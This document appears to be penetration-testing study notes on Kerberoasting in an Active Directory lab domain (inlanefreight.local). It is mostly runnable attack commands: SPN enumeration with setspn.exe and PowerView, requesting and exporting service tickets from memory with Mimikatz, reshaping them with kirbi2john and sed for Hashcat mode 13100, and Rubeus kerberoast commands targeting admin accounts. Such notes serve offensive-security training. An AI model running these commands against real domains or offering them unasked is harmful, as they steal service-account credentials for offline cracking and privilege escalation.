
## Manual ways of stealing Kerberos tickets


#### Enumerating SPNs with setspn.exe


```ruby
setspn.exe -Q */*
```

We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`.

```ruby
Add-Type -AssemblyName System.IdentityModel
```

Let's try this by targeting a single user:
```ruby
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```


#### Retrieving All Tickets Using setspn.exe

```ruby
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.
Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

## Extracting Tickets from Memory with Mimikatz

```ruby
mimikatz # base64 /out:true
```

```ruby
mimikatz # kerberos::list /export  
```

If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.

We have two options either we send the .kirbi file to our system to crack it OR copy the base64 output and convert it to .kirbi to crack . 
### Preparing the Base64 Blob for Cracking

```ruby
echo "<base64 blob>" |  tr -d \\n 
```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

```ruby
cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

```ruby
python2.7 kirbi2john.py sqldev.kirbi
```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

```ruby
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

```ruby
cat sqldev_tgs_hashcat 
```

the hashcat mode for this hash is `13100`
the john format for this hash is `--format=krb5tgs`


------------------------------------------------------------------------
------------------------------------------------------------------------


## Automated / Tool Based Route

#### Using PowerView to Enumerate SPN Accounts

```ruby
Import-Module .\PowerView.ps1
```

```ruby
Get-DomainUser * -spn | select samaccountname
```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

#### Using PowerView to Target a Specific User

```ruby
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Finally, we can export all tickets to a CSV file for offline processing.

```ruby
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Viewing the Contents of the .CSV File

```ruby
cat .\ilfreight_tgs.csv
```



We can also use `Rebeus` from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.


## Using Rubeus

this command will bring the local administrators' hash

```ruby
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

And with this command we get the user's hash

```ruby
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat.

